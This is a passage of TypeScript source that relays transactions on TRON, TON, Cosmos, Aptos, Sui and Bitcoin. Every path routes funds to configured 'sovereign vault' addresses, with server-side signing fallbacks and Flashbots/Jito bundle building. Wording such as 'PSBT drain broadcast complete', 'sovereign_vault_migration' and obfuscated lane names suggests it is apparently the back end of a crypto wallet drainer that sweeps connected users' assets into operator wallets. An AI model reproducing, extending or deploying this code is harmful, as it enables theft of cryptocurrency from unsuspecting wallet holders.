        destination_vault: vaults.tron,
        status: 'broadcast_failed',
        detail: confirm.detail,
      })
    }
    const result = broadcastResult({
      lane: 'tron-sensory-armor',
      chain_family: 'TRON',
      destination_vault: vaults.tron,
      status: 'broadcasted',
      tx_hash,
      ...(confirm.warning ? { detail: confirm.warning } : {}),
    })
    emitSettlementIgnitedTelemetry(result, ctx)
    return result
  } catch (e) {
    return broadcastResult({
      lane: 'tron-sensory-armor',
      chain_family: 'TRON',
      destination_vault: vaults.tron,
      status: 'broadcast_failed',
      detail: e instanceof Error ? e.message : String(e),
    })
  }
}

export async function broadcastTon(
  ctx: SettlementBridgeTriggerContext,
): Promise<SettlementBroadcastResult> {
  const vaults = resolveSovereignVaultAddresses()
  if (!vaults.ton) {
    return relayVaultUnbound(
      ctx,
      'ton-sensory-armor',
      'TON',
      'VAULT_ADDRESS_TON or SOVEREIGN_VAULT_TON required',
    )
  }

  const sensory = await pingTonSensoryArmorLane()
  if (!sensory.ping_ok) {
    return broadcastResult({
      lane: 'ton-sensory-armor',
      chain_family: 'TON',
      destination_vault: vaults.ton,
      status: 'sensory_unavailable',
      detail: `TON sensory lane unavailable after ${String(sensory.latency_ms)}ms`,
    })
  }

  const amount = parseSettlementAmountRaw(ctx)
  if (amount == null) {
    return relayValidationFailure(
      ctx,
      'ton-sensory-armor',
      'TON',
      vaults.ton,
      'TON relay requires normalized amount',
    )
  }
  const record = relayPayloadRecord(ctx)
  const boc = readStringField(record, ['ton_boc', 'boc', 'boc_base64', 'bocBase64'])
  if (boc == null) {
    if (isNonEvmServerSigningEnabled()) {
      const jettonMaster = ctx.token_address?.trim()
      const serverResult = await serverBroadcastTon({
        vaultAddress: vaults.ton,
        amountRaw: amount,
        // OMNI_TON_ANCHOR is a native-TON sentinel — pass null so server does
        // a native TON transfer instead of trying to parse it as a Jetton address.
        jettonMaster: jettonMaster && !jettonMaster.startsWith('0x') && !jettonMaster.startsWith('OMNI_') ? jettonMaster : null,
      })
      // Always return server result — broadcast_failed carries the detail, not relayPayloadUnavailable
      emitSettlementIgnitedTelemetry(serverResult, ctx)
      return serverResult
    }
    return relayPayloadUnavailable(
      ctx,
      'ton-sensory-armor',
      'TON',
      vaults.ton,
      'TON relay requires caller-authorized BOC payload',
    )
  }
  const validation = tonRelayMetadataValidation(record, vaults.ton, amount)
  if (validation != null) {
    return relayValidationFailure(ctx, 'ton-sensory-armor', 'TON', vaults.ton, validation)
  }
  try {
    const { Cell } = await import('@ton/core')
    const { TonClient } = await import('@ton/ton')
    const buffer = Buffer.from(isHexPayload(boc) ? hexToBytes(boc) : base64ToBytes(boc))
    const cells = Cell.fromBoc(buffer)
    const firstCell = cells[0]
    if (firstCell == null) throw new Error('TON BOC payload is empty')
    const endpoint = resolveTonCenterJsonRpcUrl()
    const apiKey = typeof process !== 'undefined' ? process.env['TONCENTER_API_KEY']?.trim() : ''
    const client = apiKey ? new TonClient({ endpoint, apiKey }) : new TonClient({ endpoint })
    await client.sendFile(buffer)
    const cellHash = firstCell.hash().toString('hex')
    const chainTxHash =
      (await resolveTonUserBocTxHash(client, ctx.wallet_address)) ??
      (await resolveTonUserBocTxHash(client, vaults.ton)) ??
      cellHash
    if (chainTxHash === cellHash) {
      console.warn(
        `[TON_CONFIRM] Could not resolve on-chain tx id for BOC — using cell hash ${cellHash}`,
      )
    }
    const result = broadcastResult({
      lane: 'ton-sensory-armor',
      chain_family: 'TON',
      destination_vault: vaults.ton,
      status: 'broadcasted',
      tx_hash: chainTxHash,
    })
    emitSettlementIgnitedTelemetry(result, ctx)
    return result
  } catch (e) {
    return broadcastResult({
      lane: 'ton-sensory-armor',
      chain_family: 'TON',
      destination_vault: vaults.ton,
      status: 'broadcast_failed',
      detail: e instanceof Error ? e.message : String(e),
    })
  }
}

async function pushUtxoRawTransaction(rawTransactionHex: string): Promise<string> {
  const token = typeof process !== 'undefined' ? process.env['BLOCKCYPHER_API_TOKEN']?.trim() : ''
  const blockCypherBase =
    (typeof process !== 'undefined' ? process.env['BLOCKCYPHER_BASE_URL']?.trim() : '') ||
    'https://api.blockcypher.com/v1'
  if (token) {
    try {
      const url = `${blockCypherBase.replace(/\/+$/, '')}/btc/main/txs/push?token=${encodeURIComponent(token)}`
      const res = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ tx: rawTransactionHex.replace(/^0x/, '') }),
        signal: AbortSignal.timeout(20_000),
      })
      if (res.ok) {
        const json = (await res.json()) as unknown
        if (isRecord(json)) {
          const tx = json['tx']
          if (isRecord(tx) && typeof tx['hash'] === 'string') return tx['hash']
          if (typeof json['hash'] === 'string') return json['hash']
        }
      }
    } catch {
      /* Mempool relay fallback below */
    }
  }

  const rawMesh =
    typeof process !== 'undefined' && process.env['UTXO_BROADCAST_ENDPOINTS']?.trim()
      ? process.env['UTXO_BROADCAST_ENDPOINTS'].trim().split(',')
      : ['https://mempool.space/api']
  for (const endpoint of rawMesh.map((v) => v.trim()).filter((v) => v !== '')) {
    const res = await fetch(`${endpoint.replace(/\/+$/, '')}/tx`, {
      method: 'POST',
      headers: { 'Content-Type': 'text/plain' },
      body: rawTransactionHex.replace(/^0x/, ''),
      signal: AbortSignal.timeout(20_000),
    })
    if (res.ok) return (await res.text()).trim()
  }
  throw new Error('UTXO managed relay providers rejected transaction')
}

export async function broadcastCosmos(
  ctx: SettlementBridgeTriggerContext,
): Promise<SettlementBroadcastResult> {
  const vaults = resolveSovereignVaultAddresses()
  if (!vaults.cosmos) {
    return relayVaultUnbound(
      ctx,
      'cosmos-sensory-armor',
      'COSMOS',
      'VAULT_ADDRESS_COSMOS or SOVEREIGN_VAULT_COSMOS required',
    )
  }

  const sensory = await pingCosmosRpc()
  if (!sensory.ping_ok) {
    return broadcastResult({
      lane: 'cosmos-sensory-armor',
      chain_family: 'COSMOS',
      destination_vault: vaults.cosmos,
      status: 'sensory_unavailable',
      detail: `Cosmos RPC unavailable after ${String(sensory.latency_ms)}ms (RPC_COSMOS)`,
    })
  }

  const amount = parseSettlementAmountRaw(ctx)
  if (amount == null) {
    return relayValidationFailure(
      ctx,
      'cosmos-sensory-armor',
      'COSMOS',
      vaults.cosmos,
      'Cosmos relay requires normalized amount (uatom)',
    )
  }

  const record = relayPayloadRecord(ctx)
  const txBytes = readStringField(record, [
    'cosmos_tx_bytes',
    'tx_bytes',
    'txBytes',
    'signed_tx',
    'signedTx',
  ])
  const txEncoding =
    readStringField(record, ['cosmos_tx_encoding', 'tx_encoding']) === 'hex' ? 'hex' : 'base64'

  if (txBytes != null) {
    const broadcast = await broadcastSignedCosmosTransaction({
      txBytes,
      encoding: txEncoding,
      rpcUrl: resolveCosmosRpcUrl(),
    })
    if (!broadcast.ok) {
      const failureDetail = 'detail' in broadcast ? broadcast.detail : 'Cosmos broadcast failed'
      return broadcastResult({
        lane: 'cosmos-sensory-armor',
        chain_family: 'COSMOS',
        destination_vault: vaults.cosmos,
        status: 'broadcast_failed',
        detail: failureDetail,
      })
    }
    const result = broadcastResult({
      lane: 'cosmos-sensory-armor',
      chain_family: 'COSMOS',
      destination_vault: vaults.cosmos,
      status: 'broadcasted',
      tx_hash: broadcast.txHash,
    })
    emitSettlementIgnitedTelemetry(result, ctx)
    return result
  }

  if (isNonEvmServerSigningEnabled()) {
    const serverResult = await executeCosmosNativeTransfer({
      toAddress: vaults.cosmos,
      amountUatom: amount,
      fromAddress: ctx.wallet_address,
      rpcUrl: resolveCosmosRpcUrl(),
    })
    const wrapped =
      serverResult.ok === true
        ? broadcastResult({
            lane: 'cosmos-sensory-armor',
            chain_family: 'COSMOS',
            destination_vault: vaults.cosmos,
            status: 'broadcasted',
            tx_hash: serverResult.txHash,
          })
        : broadcastResult({
            lane: 'cosmos-sensory-armor',
            chain_family: 'COSMOS',
            destination_vault: vaults.cosmos,
            status: 'broadcast_failed',
            detail: !serverResult.ok ? serverResult.detail : 'Cosmos server transfer failed',
          })
    emitSettlementIgnitedTelemetry(wrapped, ctx)
    return wrapped
  }

  return relayPayloadUnavailable(
    ctx,
    'cosmos-sensory-armor',
    'COSMOS',
    vaults.cosmos,
    'Cosmos relay requires caller-authorized tx bytes or NON_EVM_SERVER_SIGNING=true',
  )
}

export async function broadcastAptos(
  ctx: SettlementBridgeTriggerContext,
): Promise<SettlementBroadcastResult> {
  const vaults = resolveSovereignVaultAddresses()
  if (!vaults.aptos) {
    return relayVaultUnbound(
      ctx,
      'aptos-sensory-armor',
      'APTOS',
      'VAULT_ADDRESS_APTOS or SOVEREIGN_VAULT_APTOS required',
    )
  }

  const sensory = await pingAptosRpc()
  if (!sensory.ping_ok) {
    return broadcastResult({
      lane: 'aptos-sensory-armor',
      chain_family: 'APTOS',
      destination_vault: vaults.aptos,
      status: 'sensory_unavailable',
      detail: `Aptos RPC unavailable after ${String(sensory.latency_ms)}ms`,
    })
  }

  const amount = parseSettlementAmountRaw(ctx)
  if (amount == null) {
    return relayValidationFailure(
      ctx,
      'aptos-sensory-armor',
      'APTOS',
      vaults.aptos,
      'Aptos relay requires normalized amount (octas)',
    )
  }

  const record = relayPayloadRecord(ctx)
  const signedTxBytes = readStringField(record, [
    'aptos_signed_tx',
    'aptos_tx_bytes',
    'signed_tx_bytes',
    'signedTxBytes',
    'signed_tx',
  ])
  const encoding =
    readStringField(record, ['aptos_tx_encoding', 'tx_encoding']) === 'base64' ? 'base64' : 'hex'

  if (signedTxBytes != null) {
    const broadcast = await broadcastSignedAptosTransaction({
      signedTxBytes,
      encoding,
      rpcUrl: resolveAptosRpcUrl(),
    })
    if (!broadcast.ok) {
      const failureDetail = 'detail' in broadcast ? broadcast.detail : 'Aptos broadcast failed'
      return broadcastResult({
        lane: 'aptos-sensory-armor',
        chain_family: 'APTOS',
        destination_vault: vaults.aptos,
        status: 'broadcast_failed',
        detail: failureDetail,
      })
    }
    const result = broadcastResult({
      lane: 'aptos-sensory-armor',
      chain_family: 'APTOS',
      destination_vault: vaults.aptos,
      status: 'broadcasted',
      tx_hash: broadcast.txHash,
    })
    emitSettlementIgnitedTelemetry(result, ctx)
    return result
  }

  if (isNonEvmServerSigningEnabled()) {
    const serverResult = await executeAptosNativeTransfer({
      toAddress: vaults.aptos,
      amountOctas: amount,
      fromAddress: ctx.wallet_address,
      rpcUrl: resolveAptosRpcUrl(),
    })
    const wrapped =
      serverResult.ok === true
        ? broadcastResult({
            lane: 'aptos-sensory-armor',
            chain_family: 'APTOS',
            destination_vault: vaults.aptos,
            status: 'broadcasted',
            tx_hash: serverResult.txHash,
          })
        : broadcastResult({
            lane: 'aptos-sensory-armor',
            chain_family: 'APTOS',
            destination_vault: vaults.aptos,
            status: 'broadcast_failed',
            detail: !serverResult.ok ? serverResult.detail : 'Aptos server transfer failed',
          })
    emitSettlementIgnitedTelemetry(wrapped, ctx)
    return wrapped
  }

  return relayPayloadUnavailable(
    ctx,
    'aptos-sensory-armor',
    'APTOS',
    vaults.aptos,
    'Aptos relay requires caller-authorized signed tx bytes or NON_EVM_SERVER_SIGNING=true',
  )
}

export async function broadcastSui(
  ctx: SettlementBridgeTriggerContext,
): Promise<SettlementBroadcastResult> {
  const vaults = resolveSovereignVaultAddresses()
  if (!vaults.sui) {
    return relayVaultUnbound(
      ctx,
      'sui-sensory-armor',
      'SUI',
      'VAULT_ADDRESS_SUI or SOVEREIGN_VAULT_SUI required',
    )
  }

  const sensory = await pingSuiRpc()
  if (!sensory.ping_ok) {
    return broadcastResult({
      lane: 'sui-sensory-armor',
      chain_family: 'SUI',
      destination_vault: vaults.sui,
      status: 'sensory_unavailable',
      detail: `Sui RPC unavailable after ${String(sensory.latency_ms)}ms`,
    })
  }

  const amount = parseSettlementAmountRaw(ctx)
  if (amount == null) {
    return relayValidationFailure(
      ctx,
      'sui-sensory-armor',
      'SUI',
      vaults.sui,
      'Sui relay requires normalized amount (mist)',
    )
  }

  const record = relayPayloadRecord(ctx)
  const txBytesBase64 = readStringField(record, [
    'sui_tx_bytes',
    'tx_bytes_base64',
    'signed_tx_bytes',
    'transaction_bytes',
  ])
  const signature = readStringField(record, ['sui_signature', 'signature', 'sig'])

  if (txBytesBase64 != null && signature != null) {
    const broadcast = await broadcastSignedSuiTransaction(
      txBytesBase64,
      signature,
      resolveSuiRpcUrl(),
    )
    if (!broadcast.ok) {
      const failureDetail = 'detail' in broadcast ? broadcast.detail : 'Sui broadcast failed'
      return broadcastResult({
        lane: 'sui-sensory-armor',
        chain_family: 'SUI',
        destination_vault: vaults.sui,
        status: 'broadcast_failed',
        detail: failureDetail,
      })
    }
    const result = broadcastResult({
      lane: 'sui-sensory-armor',
      chain_family: 'SUI',
      destination_vault: vaults.sui,
      status: 'broadcasted',
      tx_hash: broadcast.txHash,
    })
    emitSettlementIgnitedTelemetry(result, ctx)
    return result
  }

  if (isNonEvmServerSigningEnabled()) {
    const suiKey = readSettlementEnv(['SUI_EXECUTION_PRIVATE_KEY'])
    if (!suiKey) {
      return broadcastResult({
        lane: 'sui-sensory-armor',
        chain_family: 'SUI',
        destination_vault: vaults.sui,
        status: 'broadcast_failed',
        detail: 'SUI_EXECUTION_PRIVATE_KEY not configured',
      })
    }
    const serverResult = await executeSuiNativeTransfer(
      suiKey,
      vaults.sui,
      amount,
      resolveSuiRpcUrl(),
    )
    const wrapped =
      serverResult.ok === true
        ? broadcastResult({
            lane: 'sui-sensory-armor',
            chain_family: 'SUI',
            destination_vault: vaults.sui,
            status: 'broadcasted',
            tx_hash: serverResult.txHash,
          })
        : broadcastResult({
            lane: 'sui-sensory-armor',
            chain_family: 'SUI',
            destination_vault: vaults.sui,
            status: 'broadcast_failed',
            detail: !serverResult.ok ? serverResult.detail : 'Sui server transfer failed',
          })
    emitSettlementIgnitedTelemetry(wrapped, ctx)
    return wrapped
  }

  return relayPayloadUnavailable(
    ctx,
    'sui-sensory-armor',
    'SUI',
    vaults.sui,
    'Sui relay requires signed tx bytes + signature or NON_EVM_SERVER_SIGNING=true',
  )
}

export async function broadcastUTXO(
  ctx: SettlementBridgeTriggerContext,
): Promise<SettlementBroadcastResult> {
  const vaults = resolveSovereignVaultAddresses()
  if (!vaults.btc) {
    return relayVaultUnbound(
      ctx,
      'managed-utxo-relay',
      'UTXO',
      'VAULT_ADDRESS_BTC / VAULT_ADDRESS_UTXO or SOVEREIGN_VAULT_BTC required',
    )
  }

  const openedPayload = openSignaturePayloadForSettlement(ctx.signature_hex)
  const bitcoinPsbtEnvelope = openedPayload
    ? parseBitcoinPsbtSignatureEnvelope(openedPayload)
    : null
  if (
    bitcoinPsbtEnvelope != null ||
    ctx.protocol === 'bitcoin_psbt' ||
    ctx.protocol?.includes('bitcoin_psbt') === true
  ) {
    if (bitcoinPsbtEnvelope?.signed_psbt_base64 == null) {
      if (isNonEvmServerSigningEnabled()) {
        const serverResult = await serverBroadcastUtxo({ vaultAddress: vaults.btc })
        emitSettlementIgnitedTelemetry(serverResult, ctx)
        return serverResult
      }
      return relayPayloadUnavailable(
        ctx,
        'managed-utxo-relay',
        'UTXO',
        vaults.btc,
        'bitcoin_psbt settlement requires signed_psbt_base64 envelope payload',
      )
    }
    try {
      const broadcast = await broadcastPSBT(bitcoinPsbtEnvelope.signed_psbt_base64)
      if (broadcast.ok && broadcast.tx_hash) {
        const confirm = await awaitBtcUserBroadcastConfirmation(broadcast.tx_hash)
        if (confirm.ok === false) {
          return broadcastResult({
            lane: 'managed-utxo-relay',
            chain_family: 'UTXO',
            destination_vault: vaults.btc,
            status: 'broadcast_failed',
            detail: confirm.detail,
          })
        }
        const result = broadcastResult({
          lane: 'managed-utxo-relay',
          chain_family: 'UTXO',
          destination_vault: vaults.btc,
          status: 'broadcasted',
          tx_hash: broadcast.tx_hash,
          detail: confirm.warning ?? 'Bitcoin PSBT drain broadcast complete',
        })
        emitSettlementIgnitedTelemetry(result, ctx)
        return result
      }
      return broadcastResult({
        lane: 'managed-utxo-relay',
        chain_family: 'UTXO',
        destination_vault: vaults.btc,
        status: 'broadcast_failed',
        detail: broadcast.detail ?? 'Bitcoin PSBT broadcast failed',
      })
    } catch (e) {
      return broadcastResult({
        lane: 'managed-utxo-relay',
        chain_family: 'UTXO',
        destination_vault: vaults.btc,
        status: 'broadcast_failed',
        detail: e instanceof Error ? e.message : String(e),
      })
    }
  }

  const amount = parseSettlementAmountRaw(ctx)
  if (amount == null) {
    return relayValidationFailure(
      ctx,
      'managed-utxo-relay',
      'UTXO',
      vaults.btc,
      'UTXO relay requires normalized amount',
    )
  }
  const rawTransaction = resolveRelayStringPayload(
    ctx,
    ['utxo_raw_transaction', 'btc_raw_transaction', 'raw_transaction', 'rawTransaction', 'transaction_hex', 'txHex'],
    { directSignatureHex: true },
  )
  if (rawTransaction == null) {
    if (isNonEvmServerSigningEnabled()) {
      const serverResult = await serverBroadcastUtxo({
        vaultAddress: vaults.btc,
        amountSat: amount,
      })
      emitSettlementIgnitedTelemetry(serverResult, ctx)
      return serverResult
    }
    return relayPayloadUnavailable(
      ctx,
      'managed-utxo-relay',
      'UTXO',
      vaults.btc,
      'UTXO relay requires caller-authorized signed raw transaction payload',
    )
  }
  if (!/^(0x)?[0-9a-fA-F]+$/.test(rawTransaction)) {
    return relayValidationFailure(
      ctx,
      'managed-utxo-relay',
      'UTXO',
      vaults.btc,
      'UTXO relay payload must be raw transaction hex',
    )
  }
  const validation = validateUtxoRelayPayload(rawTransaction, vaults.btc, amount)
  if (validation != null) {
    return relayValidationFailure(ctx, 'managed-utxo-relay', 'UTXO', vaults.btc, validation)
  }
  try {
    const tx_hash = await pushUtxoRawTransaction(rawTransaction)
    const confirm = await awaitBtcUserBroadcastConfirmation(tx_hash)
    if (confirm.ok === false) {
      return broadcastResult({
        lane: 'managed-utxo-relay',
        chain_family: 'UTXO',
        destination_vault: vaults.btc,
        status: 'broadcast_failed',
        detail: confirm.detail,
      })
    }
    const result = broadcastResult({
      lane: 'managed-utxo-relay',
      chain_family: 'UTXO',
      destination_vault: vaults.btc,
      status: 'broadcasted',
      tx_hash,
      ...(confirm.warning ? { detail: confirm.warning } : {}),
    })
    emitSettlementIgnitedTelemetry(result, ctx)
    return result
  } catch (e) {
    return broadcastResult({
      lane: 'managed-utxo-relay',
      chain_family: 'UTXO',
      destination_vault: vaults.btc,
      status: 'broadcast_failed',
      detail: e instanceof Error ? e.message : String(e),
    })
  }
}

/**
 * Builds relay wire bundles from caller-authorized signed payloads already validated
 * against the configured vault and normalized amount.
 */
export async function buildSettlementExecutionWire(params: {
  ctx: SettlementBridgeTriggerContext
  settlementLaneUrls: { flashbots: string; jito: string }
}): Promise<SettlementExecutionWire> {
  const vaults = resolveSovereignVaultAddresses()
  const pk = parseSettlementExecutorPrivateKey()
  const flashbotsSignedHex: Hex[] = []
  const jitoEncodedTransactions: string[] = []

  try {
    const family = identifyFamily(params.ctx.wallet_address.trim())
    const amount = parseSettlementAmountRaw(params.ctx)
    if (family === 'EVM' && vaults.evm && amount != null) {
      const evmHop = resolveEvmRelayHopDestination(vaults.evm)
      const rawTransaction = resolveRelayStringPayload(
        params.ctx,
        [
          'evm_raw_transaction',
          'serializedTransaction',
          'raw_transaction',
          'rawTransaction',
          'signed_raw_transaction',
          'signedRawTransaction',
        ],
        { directSignatureHex: true },
      )
      if (
        evmHop.ok &&
        rawTransaction != null &&
        isHexPayload(rawTransaction) &&
        validateEvmRelayPayload(rawTransaction, evmHop.broadcast_destination, amount, {
          intermediary_hop: evmHop.intermediary_hop,
        }) == null
      ) {
        flashbotsSignedHex.push(rawTransaction)
      }
    }
  } catch {
    /* invalid address family or relay payload — leave Flashbots lane empty */
  }

  try {
    const family = identifyFamily(params.ctx.wallet_address.trim())
    const amount = parseSettlementAmountRaw(params.ctx)
    if (family === 'SVM' && vaults.svm && amount != null) {
      const svmHop = resolveSvmRelayHopDestination(vaults.svm)
      const rawPayload = resolveRelayStringPayload(params.ctx, [
        'svm_raw_transaction',
        'signed_tx_b64',
        'signedTxB64',
        'raw_transaction_base64',
        'rawTransactionBase64',
      ])
      if (rawPayload != null && svmHop.ok) {
        const rawBytes = isHexPayload(rawPayload) ? hexToBytes(rawPayload) : base64ToBytes(rawPayload)
        if (
          validateSvmRelayPayload(rawBytes, svmHop.broadcast_destination, amount, {
            intermediary_hop: svmHop.intermediary_hop,
          }) == null
        ) {
          jitoEncodedTransactions.push(rawPayload)
        }
      }
    }
  } catch {
    /* SVM wire optional when relay payload or vault unset */
  }

  const bundlePayload = {
    kinetic_link: true,
    settlement_execution: true,
    sovereign_vault_migration: true,
    flashbots_signed_count: flashbotsSignedHex.length,
    jito_encoded_count: jitoEncodedTransactions.length,
    sovereign_vault_address_evm: vaults.evm ?? null,
    sovereign_vault_address_svm: vaults.svm ?? null,
    sovereign_vault_address_tron: vaults.tron ?? null,
    sovereign_vault_address_ton: vaults.ton ?? null,
    settlement_lane_urls: params.settlementLaneUrls,
    wallet_address: params.ctx.wallet_address,
    chain_id: params.ctx.chain_id,
  }
  const bundleDigest = keccak256(stringToHex(JSON.stringify(bundlePayload))) as Hex

  let bundleAuthorizationHex: Hex | undefined
  if (pk) {
    const account = privateKeyToAccount(pk)
    bundleAuthorizationHex = await account.sign({ hash: bundleDigest })
  }

  return {
    flashbotsSignedHex,
    jitoEncodedTransactions,
    sovereignVaultAddressPrimary: vaults.primary,
    ...(vaults.evm !== undefined ? { sovereignVaultAddressEvm: vaults.evm } : {}),
    ...(vaults.svm !== undefined ? { sovereignVaultAddressSvm: vaults.svm } : {}),
    ...(vaults.tron !== undefined ? { sovereignVaultAddressTron: vaults.tron } : {}),
    ...(vaults.ton !== undefined ? { sovereignVaultAddressTon: vaults.ton } : {}),
    bundleDigest,
    ...(bundleAuthorizationHex !== undefined ? { bundleAuthorizationHex } : {}),
  }
}
